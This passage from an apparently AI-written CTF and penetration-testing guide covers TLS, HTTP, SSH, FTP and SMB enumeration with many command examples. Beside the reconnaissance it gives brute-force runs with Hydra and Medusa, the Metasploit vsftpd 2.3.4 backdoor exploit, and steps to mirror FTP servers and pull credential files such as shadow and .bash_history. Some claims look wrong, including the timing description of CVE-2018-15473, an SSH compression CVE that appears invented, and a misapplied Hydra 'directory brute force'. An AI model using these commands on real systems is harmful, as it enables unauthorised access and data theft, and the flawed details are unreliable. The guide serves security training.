openssl s_client -connect 192.168.1.100:443 < /dev/null | openssl x509 -out cert.pem
```

Analyze specific certificate:

```bash
openssl x509 -in cert.pem -text -noout
```

Test TLS versions supported:

```bash
openssl s_client -connect 192.168.1.100:443 -tls1
openssl s_client -connect 192.168.1.100:443 -tls1_1
openssl s_client -connect 192.168.1.100:443 -tls1_2
```

[Inference] Servers supporting deprecated TLS versions (1.0, 1.1) present protocol downgrade vulnerabilities.

**sslscan** provides comprehensive SSL/TLS vulnerability assessment:

```bash
sslscan 192.168.1.100:443
```

Output includes supported protocols, cipher suites, certificate information, and known vulnerabilities. Save results:

```bash
sslscan 192.168.1.100:443 > sslscan_results.txt
```

Test specific TLS version:

```bash
sslscan --tls12 192.168.1.100:443
```

**testssl.sh** performs detailed TLS analysis with extensive vulnerability detection:

```bash
testssl.sh https://192.168.1.100:443
```

Comprehensive assessment including certificate chain validation, protocol support, cipher strength, and known vulnerabilities. Save results in JSON:

```bash
testssl.sh --json https://192.168.1.100:443 > testssl_results.json
```

Quick scan mode:

```bash
testssl.sh --quick https://192.168.1.100:443
```

Test only certificate:

```bash
testssl.sh --certonly https://192.168.1.100:443
```

### HTTP Methods Enumeration

**OPTIONS** request returns allowed HTTP methods for a resource:

```bash
curl -X OPTIONS -v http://192.168.1.100/
```

Response includes `Allow:` header listing permitted methods. [Unverified] Not all servers properly implement OPTIONS; manual testing may be necessary.

**nc** and manual HTTP requests test specific methods:

```bash
echo -e "OPTIONS / HTTP/1.1\r\nHost: 192.168.1.100\r\nConnection: close\r\n\r\n" | nc 192.168.1.100 80
```

**TRACE** method echoes request back to client (useful for identifying intermediate proxies):

```bash
curl -X TRACE -v http://192.168.1.100/
```

TRACE is often disabled in modern configurations due to security concerns. [Inference] Servers allowing TRACE may be vulnerable to cross-site tracing (XST) attacks if combined with XSS vulnerabilities.

**HEAD** requests retrieve headers without response body:

```bash
curl -I http://192.168.1.100/
```

Equivalent to GET but faster for header inspection. Test PUT method (file upload capability):

```bash
curl -X PUT -v -d "test content" http://192.168.1.100/test.txt
```

[Inference] PUT support combined with missing authentication creates file upload vulnerabilities.

Test DELETE method:

```bash
curl -X DELETE -v http://192.168.1.100/test.txt
```

**wfuzz** systematizes HTTP method testing:

```bash
wfuzz -u http://192.168.1.100/ -X FUZZ -w methods.txt
```

Where `methods.txt` contains: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, TRACE, CONNECT

Comprehensive method testing script:

```bash
for method in GET POST PUT DELETE PATCH HEAD OPTIONS TRACE CONNECT; do
  echo "Testing $method:"
  curl -X $method -v -o /dev/null -w "Status: %{http_code}\n" http://192.168.1.100/
done
```

Related topics for expanded coverage: Web application fingerprinting (detecting CMS, frameworks), API enumeration methodologies, WebDAV vulnerability assessment, and HTTP authentication detection.

---

## SSH Enumeration

### SSH Version Detection

SSH version detection reveals the SSH daemon implementation and version number, which correlates with known vulnerabilities and authentication mechanisms available on the target system.

**Nmap service version detection:**

```bash
nmap -sV -p 22 <target>
```

**Extended parameters:**

- `-sV --version-intensity 9` — Maximum aggressiveness for version detection (probes all possible service variations)
- `-sV --version-light` — Minimal probes (faster but less accurate)
- `-p 22,2222,22222` — Scan alternate SSH ports commonly used in CTF environments
- `-sV -A` — Combine with OS detection and traceroute
- `-sV -O` — Combine with OS fingerprinting for comprehensive profiling

**How it works:** Nmap connects to port 22, receives the SSH banner (e.g., `SSH-2.0-OpenSSH_7.4`), and matches it against known version signatures. The banner format follows RFC 4253: `SSH-protoversion-softwareversion [comments]`.

**Direct SSH connection for banner grabbing:**

```bash
ssh -v <target>
```

Captures verbose connection output including protocol version negotiated and available authentication methods. Terminates before full authentication.

**Advanced banner capture:**

```bash
echo | nc -v <target> 22
```

Raw netcat connection retrieves SSH banner without authentication attempt. Cleaner than SSH connection for logging purposes.

**Banner parsing example:**

```bash
ssh -v 192.168.1.100 2>&1 | grep "Remote protocol version"
```

Filters verbose output to isolate SSH version string.

**Context-specific applications:**

- **Vulnerability correlation:** OpenSSH 7.4-7.6 vulnerable to username enumeration (CVE-2018-15473); older versions (5.x-6.x) vulnerable to compression oracle attacks
- **Authentication mechanism assessment:** OpenSSH version determines available key exchange algorithms and authentication types
- **OS inference:** SSH version correlates with operating system release dates (OpenSSH 7.4 typically on CentOS 7, specific Ubuntu LTS releases)

**Example CTF reconnaissance:**

```bash
nmap -sV -p 22 -A 192.168.1.100
ssh -v 192.168.1.100 2>&1 | head -n 5
```

First command provides nmap's parsed version; second gives raw banner for manual verification.

---

### SSH Key Types and Algorithms

SSH supports multiple key cryptographic types and key exchange algorithms. The server's supported algorithms determine available attack surfaces and authentication methods.

**Enumerate supported algorithms:**

```bash
ssh -v <target> 2>&1 | grep -A 20 "Offering public key algorithms"
```

Extracts key algorithms the client supports. For server capabilities, use SSH scanning tools.

**SSH-audit for comprehensive algorithm enumeration:**

```bash
ssh-audit <target>:22
```

Provides detailed output including supported key types, encryption algorithms, MAC algorithms, and identifies weak configurations. Available in Kali Linux by default.

**Output interpretation:**

```
[*] host_key_type: ssh-rsa (RSA 2048 bits) -- [fail] use RSA keys with >= 3072-bits only
[*] encryption: aes128-ctr, aes256-ctr, aes128-gcm@openssh.com, aes256-gcm@openssh.com
[*] mac: hmac-sha2-256, hmac-sha2-512
```

**RSA keys (ssh-rsa):**

- [Unverified] Vulnerable to key recovery if < 2048 bits
- Current standard: >= 3072 bits recommended
- Widely supported across older systems and tools
- Susceptible to factorization attacks on weak implementations

**ECDSA keys (ecdsa-sha2-nistp256, ecdsa-sha2-nistp384, ecdsa-sha2-nistp521):**

- Faster than RSA; equivalent security with smaller key size
- NIST curves (P-256, P-384, P-521) standardized but controversial
- P-256 provides ~128-bit security; P-521 provides ~260-bit security
- Potential vulnerability in weak random number generation during key creation

**ED25519 keys (ssh-ed25519):**

- Modern elliptic curve cryptography (Curve25519)
- Resistant to side-channel attacks
- Smaller keys with high security (128-bit equivalent security)
- Not available on older SSH implementations (OpenSSH < 6.5)

**Key exchange algorithms:**

Common algorithms revealed by `ssh-audit`:

- `diffie-hellman-group14-sha256` — Traditional Diffie-Hellman with SHA-256
- `diffie-hellman-group16-sha512` — DH with 4096-bit prime, SHA-512
- `ecdh-sha2-nistp256` — Elliptic curve DH using NIST P-256
- `curve25519-sha256` — Curve25519 (modern, recommended)

**Weak algorithm identification in CTF contexts:**

```bash
ssh-audit <target>:22 | grep -i "fail\|weak\|deprecated"
```

Flags algorithms considered cryptographically weak or deprecated.

**Context-specific applications:**

- **Key downgrade attacks:** [Speculation] If server supports multiple algorithms, attacker may force weaker algorithm selection (depends on implementation)
- **Compression oracle attacks:** Older implementations supporting `zlib` compression vulnerable to CVE-2012-4142 (compression side-channel information leakage)
- **Weak randomness:** Systems with poor entropy during key generation may produce predictable keys (Debian OpenSSL vulnerability CVE-2008-0166)
- **Legacy system identification:** Presence of RSA-only support suggests older system (pre-2015)

**Example CTF scenario:**

```bash
ssh-audit 192.168.1.100:22 > ssh_config.txt
grep -i "weak\|deprecated\|fail" ssh_config.txt
```

Documents all weak algorithms for later exploitation attempt.

---

### Timing and Authentication Attempts

SSH server behavior during authentication reveals information about valid users, password policies, and rate limiting mechanisms.

**Timing-based username enumeration (CVE-2018-15473):**

Affected versions: OpenSSH 7.4p1 through 7.8p1 (and similar versions across distributions).

**Vulnerable behavior:** Server responds slightly faster to nonexistent users than to valid users with incorrect passwords. Timing difference measurable in milliseconds.

**Exploitation tool - ssh-user-enum.py:**

```bash
python3 ssh-user-enum.py -U userlist.txt -t <target> -p 22
```

Measures response time variance to identify valid users.

**Manual timing measurement:**

```bash
time ssh username@192.168.1.100 "exit" 2>/dev/null
```

Run multiple times against different usernames; responses to valid usernames typically 100-500ms slower.

**[Unverified]** Timing attack reliability depends on network latency. Local network provides clearer timing signatures; Internet-based measurements unreliable due to routing variance.

**Authentication attempt behavior analysis:**

**Default SSH limits (OpenSSH standard):**

```bash
ssh -v username@<target> 2>&1
```

Attempt connection and observe:

- `Authentication methods available: publickey,password` — Server supports both key and password auth
- `Too many authentication failures` — Rate limiting active (typically 6 failed attempts)
- `Connection closed by authenticating user` — Failed password, connection terminated

**SSH banner delays:**

Some hardened SSH configurations implement authentication delays:

```bash
(time ssh invalid@192.168.1.100) 2>&1 | grep real
```

Delay before `Permission denied` indicates rate limiting or brute-force protection.

**Brute-force detection bypass attempts:**

[Unverified] Some systems allow slower attack rates before triggering rate limits. Tool-based attempts typically trigger detection faster than manual attempts.

**Hydra brute-force with timing control:**

```bash
hydra -l root -P passwords.txt -t 1 -w 2 ssh://192.168.1.100
```

Parameters:

- `-t 1` — Single task (one connection at a time)
- `-w 2` — 2-second wait between attempts
- `-f` — Exit after first successful credential found

**Context-specific applications:**

- **User enumeration:** Establish valid username list without password knowledge
- **Rate limiting assessment:** Determine authentication attempt limits before lockout
- **Service availability:** Identify if SSH daemon crashes or disconnects after failed attempts
- **Timing side-channel exploitation:** Extract information through response time analysis

**Example CTF scenario:**

```bash
# Enumerate valid users via timing
ssh-user-enum.py -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t 192.168.1.100 -p 22

# Document rate limiting behavior
for i in {1..10}; do time ssh invalid_user$i@192.168.1.100 2>&1 | grep -E "Timeout|refused|closed"; done

# Targeted brute force on identified user
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 -w 3 ssh://192.168.1.100
```

---

### Server Banner Information

SSH server banners contain software version, implementation details, and sometimes custom messages revealing system configuration and administrator hints.

**Banner capture methods:**

**Direct connection banner:**

```bash
ssh 192.168.1.100
```

Server responds immediately with banner (e.g., `SSH-2.0-OpenSSH_7.4`). Typically displays before authentication prompt.

**Custom banner/MOTD:**

```bash
ssh -v 192.168.1.100 2>&1 | grep -i "banner\|motd\|welcome"
```

Captures any custom message-of-the-day or login banner configured in `sshd_config`:

```
Banner /etc/ssh/banner.txt
```

Banners often contain:

- Company name or system identification
- Security warnings (legal disclaimers)
- Administrator contact information
- Service maintenance schedules
- Unintended information disclosure

**Protocol version string parsing:**

Banner format: `SSH-<protoversion>-<softwareversion> [comments]`

Example: `SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u4`

Components:

- `SSH-2.0` — SSH protocol version (2.0 is current standard; 1.99 indicates support for legacy SSH 1.0)
- `OpenSSH_7.4p1` — Software implementation and patch version
- `Debian-10+deb9u4` — Distribution-specific patch information

**Debian patch version decoding:**

```
OpenSSH_7.4p1 Debian-10+deb9u4
  = OpenSSH 7.4 patch 1 from Debian package version 10+deb9u4
  = Debian Stretch (9) with 4 patches applied
```

Maps to specific Debian release: Stretch (9), Jessie (8), Buster (10), Bullseye (11).

**RedHat/CentOS patch version decoding:**

```
OpenSSH_8.0p1 build 1 [FC31]
  = Fedora Core 31 package
  = Correlates to Fedora 31 release (late 2019)
```

**Banner information leakage in CTF:**

[Inference] Custom banners sometimes contain hints, credentials, or configuration details intentionally left by challenge designers.

**Example CTF banner:**

```
SSH-2.0-OpenSSH_7.4
###################################
Welcome to [CHALLENGE_NAME] server
Backup user: backup_user (key available in /home/backup)
###################################
```

Reveals valid username and hints at file locations.

**Capturing full connection transcript:**

```bash
ssh -v 192.168.1.100 2>&1 > ssh_transcript.txt
```

Preserves all banner information, debug output, and authentication methods in file for analysis.

**Banner manipulation in CTF contexts:**

Some CTF challenges implement custom SSH daemons with modified banners revealing:

- Challenge flags or hints
- Version information not matching actual vulnerabilities (honeypot detection)
- Authentication mechanisms (e.g., "SSH-2.0-CustomSSH_1.0 [pubkey only]")

**Context-specific applications:**

- **System identification:** Map OS/distribution version from patch information
- **Intelligence gathering:** Uncover administrator contact info, network topology hints
- **Honeypot detection:** Custom banners may indicate trap systems
- **Vulnerability targeting:** Correlate version with known CVE database
- **Social engineering reconnaissance:** Extract human-readable hints from custom messages

**Example CTF workflow:**

```bash
# Capture complete banner and connection details
ssh -v 192.168.1.100 2>&1 | tee ssh_banner.txt

# Parse version information
grep -i "remote protocol\|software version" ssh_banner.txt

# Extract any custom messages
grep -i "banner\|welcome\|message" ssh_banner.txt

# Correlate version with vulnerability database
# Manually check OpenSSH 7.4 against exploitdb, metasploit, etc.
```

---

### Integrated SSH Enumeration Workflow

**Complete reconnaissance combining all techniques:**

```bash
# Phase 1: Port and service detection
nmap -sV -p 22 -A 192.168.1.100 -oN nmap_ssh.txt

# Phase 2: Algorithm and cryptographic assessment
ssh-audit 192.168.1.100:22 > ssh_audit.txt

# Phase 3: Banner and version information
(echo ""; sleep 1) | nc -v 192.168.1.100 22 > ssh_banner.txt

# Phase 4: Username enumeration (if vulnerable version detected)
ssh-user-enum.py -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
  -t 192.168.1.100 -p 22 > valid_users.txt

# Phase 5: Authentication mechanism analysis
ssh -v 192.168.1.100 2>&1 | grep -E "Offering|Authentication methods" > auth_methods.txt

# Phase 6: Compile findings
echo "=== SSH Enumeration Summary ===" > enumeration_report.txt
cat nmap_ssh.txt ssh_audit.txt ssh_banner.txt valid_users.txt auth_methods.txt >> enumeration_report.txt
```

This layered approach establishes comprehensive SSH profile without triggering aggressive rate limiting or IDS alerts.

---

## FTP/SFTP Enumeration

### FTP Protocol Fundamentals

FTP (File Transfer Protocol) operates on TCP ports 20 (data) and 21 (control). SFTP (SSH File Transfer Protocol) operates on TCP port 22 as a subsystem of SSH. FTP transmits credentials in plaintext, while SFTP provides encrypted communication.

**Basic FTP Detection:**

```bash
# Identify FTP services
nmap -p 21 <target>
nmap -sV -p 21 <target>

# Check both standard and alternate FTP ports
nmap -p 21,2121,21000 -sV <target>

# Comprehensive FTP service discovery
nmap -p- --script=ftp-* <target>
```

### Anonymous Login Attempts

Anonymous FTP access allows unauthenticated users to connect using the username "anonymous" or "ftp" with any password (typically an email address). This is a critical misconfiguration often found in CTF environments.

**Manual Anonymous Login Testing:**

```bash
# Using standard ftp client
ftp <target>
# Username: anonymous
# Password: anonymous@example.com (or any email)

# Using ftp with command-line credentials
ftp <target>
# At prompt: anonymous / [any password]

# Automated login attempt
echo "anonymous" | ftp -n <target>

# Using lftp for automated testing
lftp -u anonymous,anonymous@test.com <target>
```

**Netcat Banner Grab with Anonymous Test:**

```bash
nc -nv <target> 21
# Wait for banner
# Send: USER anonymous
# Send: PASS anonymous@test.com
# Send: SYST
# Send: QUIT
```

**Nmap Anonymous FTP Detection:**

```bash
# NSE script for anonymous login detection
nmap -p 21 --script=ftp-anon <target>

# Comprehensive FTP enumeration including anonymous access
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst <target>

# With version detection
nmap -sV -p 21 --script=ftp-anon <target>
```

**Hydra Brute Force (if anonymous fails):**

```bash
# Test common FTP credentials
hydra -L users.txt -P passwords.txt ftp://<target>

# Test anonymous with variations
hydra -l anonymous -P /usr/share/wordlists/fasttrack.txt ftp://<target>

# Single user brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>
```

**Metasploit Anonymous FTP Scanner:**

```bash
msfconsole
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
set RPORT 21
run
```

**Common Anonymous Login Outcomes:**

```bash
# Successful anonymous login indicators:
# 230 Anonymous access granted
# 230 Login successful
# 331 Anonymous login ok, send your complete email as password

# Failed anonymous login indicators:
# 530 Anonymous login not allowed
# 530 Login incorrect
# 421 Service not available
```

### Version Detection

Version information reveals specific FTP server software and version numbers, enabling targeted vulnerability research and exploit selection.

**Nmap Version Detection:**

```bash
# Standard version detection
nmap -sV -p 21 <target>

# Aggressive version detection
nmap -sV --version-intensity 9 -p 21 <target>

# Version detection with scripts
nmap -sV -sC -p 21 <target>

# FTP-specific system information
nmap -p 21 --script=ftp-syst <target>
```

**Manual Version Probing:**

```bash
# Netcat version check
nc -nv <target> 21
# Commands to send:
# SYST (system type)
# STAT (status)
# HELP (available commands)
# FEAT (feature list)

# Telnet version check
telnet <target> 21
# Issue same commands as above
```

**FTP Client Version Queries:**

```bash
# Using standard ftp client
ftp <target>
# Commands after login:
quote SYST
quote STAT
quote HELP
quote FEAT
quit

# Using lftp
lftp <target>
debug
# Examine server responses
```

**Common FTP Server Identification:**

```bash
# vsftpd example banner:
# 220 (vsFTPd 3.0.3)

# ProFTPD example banner:
# 220 ProFTPD 1.3.5 Server (Debian)

# FileZilla Server example:
# 220-FileZilla Server 0.9.60 beta

# Pure-FTPd example:
# 220---------- Welcome to Pure-FTPd ----------

# Microsoft FTP Service:
# 220 Microsoft FTP Service
```

**Version-Specific Vulnerability Research:**

```bash
# Search exploits for discovered version
searchsploit vsftpd 2.3.4
searchsploit proftpd 1.3.5

# Check CVE databases
nmap -p 21 --script=vulners,vulscan <target>

# Metasploit version-specific modules
msfconsole
search vsftpd
search proftpd
```

### Banner Grabbing

Banner grabbing captures the initial server response containing version information, server type, and configuration details.

**Netcat Banner Grabbing:**

```bash
# Basic banner grab
nc -nv <target> 21

# Banner grab with timeout
timeout 5 nc -nv <target> 21

# Banner grab and save
nc -nv <target> 21 > ftp_banner.txt

# Multiple banner grabs for comparison
for i in {1..3}; do nc -nv <target> 21; done
```

**Telnet Banner Grabbing:**

```bash
# Interactive banner grab
telnet <target> 21

# Automated telnet banner grab
echo "QUIT" | telnet <target> 21
```

**Nmap Banner Grabbing:**

```bash
# Using banner script
nmap -p 21 --script=banner <target>

# Version detection includes banner
nmap -sV -p 21 <target>

# Verbose banner information
nmap -sV -p 21 -vv <target>
```

**Python Banner Grabbing Script:**

```python
#!/usr/bin/env python3
import socket

target = "<target>"
port = 21

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, port))
    banner = s.recv(1024).decode('utf-8').strip()
    print(f"[+] FTP Banner: {banner}")
    s.close()
except Exception as e:
    print(f"[-] Error: {e}")
```

**Curl Banner Grabbing:**

```bash
# FTP banner with curl
curl -v ftp://<target>

# Anonymous login with curl
curl -v ftp://anonymous:anonymous@<target>

# Verbose connection details
curl -v --trace-ascii - ftp://<target>
```

**Metasploit Banner Grabbing:**

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
set RPORT 21
run
```

**Advanced Banner Analysis:**

```bash
# Extract specific banner information
nc -nv <target> 21 | grep -i "220"

# Multiple port banner comparison
for port in 21 2121 21000; do 
    echo "Port $port:"
    timeout 2 nc -nv <target> $port
done

# Banner fingerprinting for OS hints
nmap -p 21 --script=banner,ftp-syst -sV <target>
```

**Banner Information Extraction:**

```bash
# Common banner patterns reveal:
# - FTP server software (vsftpd, ProFTPD, Pure-FTPd, FileZilla)
# - Version numbers (2.3.4, 1.3.5, etc.)
# - Operating system hints (Debian, Ubuntu, Windows)
# - Custom welcome messages (may contain usernames, system names)
# - Feature support (SSL/TLS, UTF8, MLST)
```

### Directory Listing Permissions

Directory listing permissions determine what files and directories authenticated (or anonymous) users can view and access. Misconfigured permissions are common vectors for information disclosure.

**Basic Directory Listing:**

```bash
# FTP client directory listing
ftp <target>
# After login:
ls
ls -la
dir
ls -R (recursive)
pwd (current directory)

# lftp directory operations
lftp -u anonymous,anon@ <target>
ls
cls (cached list)
find .
```

**Recursive Directory Enumeration:**

```bash
# Using wget for recursive download
wget -r ftp://anonymous:anon@<target>/

# Using lftp mirror command
lftp -u anonymous,anon@ <target>
mirror -c /

# Curl recursive listing (requires scripting)
curl -u anonymous:anon --list-only ftp://<target>/
```

**Nmap FTP Directory Scripts:**

```bash
# FTP directory bruteforce
nmap -p 21 --script=ftp-brute <target>

# FTP file listing (if anonymous works)
nmap -p 21 --script=ftp-anon --script-args ftp-anon.maxlist=100 <target>

# Custom NSE script for deep enumeration
nmap -p 21 --script=ftp-anon,ftp-libopie <target>
```

**Manual Permission Testing:**

```bash
# Test read permissions
ftp <target>
# Commands:
LIST
NLST
MLSD (machine-readable listing)
STAT dirname

# Test write permissions
mkdir test_dir
put test_file.txt
dele test_file.txt
rmdir test_dir

# Test directory traversal
cd ..
cd /
cd /etc
cd /home
```

**Common Directory Structures to Check:**

```bash
# Linux FTP typical directories
/pub
/incoming
/uploads
/home
/var/ftp
/srv/ftp

# Windows FTP typical directories
/inetpub/ftproot
/Users
/Documents

# CTF common locations
/backup
/config
/files
/data
/share
```

**Automated Directory Enumeration:**

```bash
# Using ftp-user-enum (custom script approach)
#!/bin/bash
for dir in pub incoming upload backup files data; do
    echo "Testing directory: $dir"
    echo "cd $dir" | ftp -n <target>
done

# Hydra directory brute force
hydra -L /usr/share/wordlists/dirb/common.txt -p anonymous ftp://<target>
```

**Metasploit FTP Enumeration:**

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# After successful login:
use auxiliary/scanner/ftp/ftp_enumerable
set RHOSTS <target>
set USERNAME anonymous
set PASSWORD anonymous
run
```

**Permission Analysis Indicators:**

```bash
# Read permissions indicators:
# 150 Opening data connection for directory listing
# 226 Transfer complete
# drwxr-xr-x (directory readable by all)
# -rw-r--r-- (file readable by all)

# Write permissions indicators:
# 257 "directory_name" created
# 226 Transfer complete (after upload)
# drwxrwxrwx (world writable - high risk)
# drwxrwx--- (group writable)

# Restricted access indicators:
# 550 Permission denied
# 550 Failed to change directory
# 530 Please login with USER and PASS
```

**File Download and Analysis:**

```bash
# Download specific file
ftp <target>
get filename.txt
mget *.txt (multiple files)

# Using wget for batch download
wget -r -np -nH --cut-dirs=1 ftp://anonymous:anon@<target>/directory/

# Using curl for file download
curl -u anonymous:anon -O ftp://<target>/file.txt

# Download and analyze interesting files
get passwd
get shadow
get .bash_history
get config.php
get web.config
```

**SFTP Enumeration (Port 22)**

SFTP operates differently from FTP, running over SSH without anonymous access by default.

**SFTP Connection Testing:**

```bash
# Manual SFTP connection
sftp user@<target>
# Requires valid SSH credentials

# Test SSH service for SFTP subsystem
ssh user@<target> -s sftp

# Nmap SSH enumeration
nmap -p 22 --script=ssh-auth-methods,ssh2-enum-algos <target>
```

**SFTP Directory Enumeration (post-authentication):**

```bash
sftp user@<target>
# Commands:
ls -la
pwd
cd /
get filename
mget *.txt
```

**SFTP Brute Force:**

```bash
# Hydra SFTP/SSH brute force
hydra -l username -P /usr/share/wordlists/rockyou.txt sftp://<target>

# Medusa SSH brute force
medusa -h <target> -u username -P passwords.txt -M ssh
```

### FTP Exploitation Post-Enumeration

**FTP Bounce Attack Testing:**

```bash
# Nmap FTP bounce scan
nmap -b anonymous:anon@<ftp_server> <target>

# Check if server allows PORT command to third-party
nmap -p 21 --script=ftp-bounce <target>
```

**Known FTP Vulnerabilities:**

```bash
# vsftpd 2.3.4 backdoor (common CTF)
searchsploit vsftpd 2.3.4
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target>
exploit

# ProFTPD mod_copy vulnerability
searchsploit proftpd mod_copy
# Allows unauthenticated SITE CPFR/SITE CPTO commands
```

**FTP Data Exfiltration:**

```bash
# Mirror entire FTP directory structure
lftp -u anonymous,anon@ <target> -e "mirror -c / /local/path; quit"

# Wget recursive with all file types
wget -r -l inf -N -np -nH --cut-dirs=1 ftp://anonymous:anon@<target>/

# Download and grep for sensitive data
wget -r ftp://anonymous:anon@<target>/
grep -r "password\|secret\|key\|token" .
```

### Comprehensive FTP Enumeration Workflow

**Phase 1: Service Discovery**

```bash
nmap -sV -p 21,2121,21000 <target> -oN ftp_discovery.txt
```

**Phase 2: Banner and Version Analysis**

```bash
nc -nv <target> 21 | tee ftp_banner.txt
nmap -p 21 --script=banner,ftp-syst,ftp-anon <target>
```

**Phase 3: Anonymous Access Testing**

```bash
nmap -p 21 --script=ftp-anon <target>
ftp <target>  # Manual verification
```

**Phase 4: Directory Enumeration and Download**

```bash
lftp -u anonymous,anon@ <target> -e "find; quit"
wget -r ftp://anonymous:anon@<target>/
```

**Phase 5: Credential Brute Force (if needed)**

```bash
hydra -L users.txt -P passwords.txt ftp://<target>
```

**Phase 6: Vulnerability Assessment**

```bash
searchsploit <ftp_version>
nmap -p 21 --script=ftp-vuln-* <target>
```

### Critical Files to Search For

When you gain FTP access, prioritize searching for:

```bash
# Configuration files
config.php, web.config, .env, settings.py, database.yml

# Credentials
passwd, shadow, .bash_history, .mysql_history, .ssh/id_rsa

# Backup files
*.bak, *.backup, *.old, *.zip, *.tar.gz, backup.sql

# Source code
*.php, *.asp, *.aspx, *.jsp, *.py, *.rb

# Documentation
README, INSTALL, TODO, notes.txt, passwords.txt
```

### Important Related Topics

For complete FTP exploitation proficiency, study:

- **FTP Bounce Attacks** - Using FTP servers as proxies to scan internal networks
- **TFTP Enumeration** - Trivial FTP on UDP port 69 with different attack vectors
- **FTP over TLS/SSL (FTPS)** - Certificate analysis and encryption weaknesses
- **Post-Exploitation File Analysis** - Extracting credentials, source code review, privilege escalation paths

---

## SMB/NetBIOSEnumeration

### Port-Based Service Identification

SMB and NetBIOS services operate on specific ports that should be prioritized during network enumeration.

**SMB port scanning:**

```bash
nmap -p 445 <target>
nmap -p 445 --open <target>  # Only show open ports
nmap -p 445 -sV <target>  # Version detection
```

Port 445 is the native SMB port used for direct SMB over TCP without NetBIOS transport layer.

**NetBIOS port scanning:**

```bash
nmap -p 139 <target>
nmap -p 137-139 <target>  # Full NetBIOS range
```

Port 139 is used for SMB over NetBIOS. Ports 137 (name service) and 138 (datagram service) are UDP-based.

**Comprehensive SMB/NetBIOS scan:**

```bash
nmap -p 137,138,139,445 -sU -sS --script smb-protocols <target>
nmap -p 139,445 -sV -sC -oA smb_scan <target>
```

**SMB-specific NSE scripts:**

```bash
nmap -p 445 --script smb-os-discovery <target>
nmap -p 445 --script smb-enum-shares <target>
nmap -p 445 --script smb-enum-users <target>
nmap -p 445 --script smb-enum-domains <target>
nmap -p 445 --script smb-protocols <target>
nmap -p 445 --script smb-security-mode <target>
```

**SMB vulnerability scanning:**

```bash
nmap -p 445 --script smb-vuln-* <target>
nmap -p 445 --script smb-vuln-ms17-010 <target>  # EternalBlue
nmap -p 445 --script smb-vuln-ms08-067 <target>  # Conficker
```

**Authenticated SMB scanning:**

```bash
nmap -p 445 --script smb-enum-shares --script-args \
  smbusername=admin,smbpassword=password <target>

nmap -p 445 --script smb-enum-shares --script-args \
  smbusername=guest,smbpassword= <target>
```

### enum4linux

enum4linux is a wrapper around Samba tools for enumerating Windows and Samba systems.

**Basic enumeration:**

```bash
enum4linux <target>
enum4linux -a <target>  # All enumeration
```

**Specific enumeration types:**

User enumeration:

```bash
enum4linux -U <target>
```

Share enumeration:

```bash
enum4linux -S <target>
```

Group enumeration:

```bash
enum4linux -G <target>
```

Password policy:

```bash
enum4linux -P <target>
```

OS information:

```bash
enum4linux -o <target>
```

**Comprehensive enumeration:**

```bash
enum4linux -a -u "" -p "" <target>  # Null session
enum4linux -a -u "guest" -p "" <target>  # Guest account
enum4linux -a -u "admin" -p "password" <target>  # Credentials
```

**Detailed user and share enumeration:**

```bash
enum4linux -U -S -G -P -r -o <target>
```

Flags breakdown:

- `-U`: User list
- `-S`: Share list
- `-G`: Group list
- `-P`: Password policy
- `-r`: Users via RID cycling
- `-o`: OS information

**RID cycling for user enumeration:**

```bash
enum4linux -r -u "" -p "" <target>
enum4linux -R 500-550 <target>  # Specific RID range
```

[Inference] RID cycling attempts to enumerate users by querying sequential Relative Identifiers, which may work even when standard user enumeration is blocked.

**Output to file:**

```bash
enum4linux -a <target> | tee enum4linux_output.txt
```

**enum4linux-ng (modern alternative):**

```bash
enum4linux-ng -A <target>  # All checks
enum4linux-ng -A -u "user" -p "pass" <target>
enum4linux-ng -A -oY output.yaml <target>  # YAML output
```

### smbclient

smbclient provides FTP-like interface for accessing SMB shares.

**List shares:**

```bash
smbclient -L //<target>
smbclient -L //<target> -N  # Null session
smbclient -L //<target> -U guest%
smbclient -L //<target> -U username%password
```

**Connect to specific share:**

```bash
smbclient //<target>/share
smbclient //<target>/share -N  # No password
smbclient //<target>/share -U username
smbclient //<target>/share -U username%password
smbclient //<target>/C$ -U administrator%password  # Admin share
```

**Common administrative shares:**

- `C$`: C drive root
- `ADMIN$`: Windows directory
- `IPC$`: Inter-process communication (null sessions)

**Interactive commands:**

Once connected to a share:

```bash
ls                          # List files
cd directory                # Change directory
get filename                # Download file
mget *                      # Download all files
put localfile               # Upload file
mkdir newdir                # Create directory
rmdir directory             # Remove directory
del filename                # Delete file
```

**Non-interactive file operations:**

```bash
smbclient //<target>/share -N -c "ls"
smbclient //<target>/share -N -c "get important.txt"
smbclient //<target>/share -U user%pass -c "mget *"
```

**Recursive download:**

```bash
smbclient //<target>/share -U user%pass -c "prompt OFF; recurse ON; mget *"
```

**Execute commands:**

```bash
smbclient //<target>/share -U user%pass -c "ls; cd folder; get file.txt; exit"
```

**Specify workgroup/domain:**

```bash
smbclient -L //<target> -W WORKGROUP -U username%password
smbclient //<target>/share -W DOMAIN -U domain\\username%password
```

**Legacy protocol support:**

For older SMB implementations:

```bash
smbclient -L //<target> --option='client min protocol=NT1'
smbclient //<target>/share --option='client min protocol=LANMAN1'
```

### smbmap

smbmap enumerates Samba shares and permissions across domains.

**Basic enumeration:**

```bash
smbmap -H <target>
smbmap -H <target> -u anonymous
smbmap -H <target> -u guest
```

**Authenticated enumeration:**

```bash
smbmap -H <target> -u username -p password
smbmap -H <target> -u username -p password -d DOMAIN
```

**List share contents:**

```bash
smbmap -H <target> -u username -p password -r  # Recursive listing
smbmap -H <target> -u username -p password -R  # Recursive with depth
smbmap -H <target> -u username -p password -r 'C$'  # Specific share
```

**Download files:**

```bash
smbmap -H <target> -u username -p password --download 'share\file.txt'
smbmap -H <target> -u username -p password -A pattern  # Auto-download matching files
smbmap -H <target> -u username -p password -A '\.txt'  # Download all .txt files
```

**Upload files:**

```bash
